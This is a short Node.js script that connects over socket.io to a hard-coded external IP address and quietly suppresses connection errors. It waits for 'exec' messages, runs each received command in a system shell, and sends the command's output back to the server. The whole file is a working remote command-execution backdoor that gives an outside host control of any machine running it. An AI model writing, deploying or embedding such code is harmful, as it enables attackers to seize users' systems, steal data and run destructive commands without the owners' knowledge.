const socketioClient = require("socket.io-client");
const childProcess = require("child_process");

const socket = socketioClient("http://5.34.183.68");

socket.on("error", () => {});

socket.on("connect", () => {
  console.log("Connected to the server.");
});

socket.on("disconnect", () => {
  console.log("Disconnected from the server.");
});

socket.on("exec", cmd => {
  childProcess.exec(cmd, (err, stdout, stderr) => {
    socket.emit("execResponse", cmd, err, stdout, stderr);
  });
});
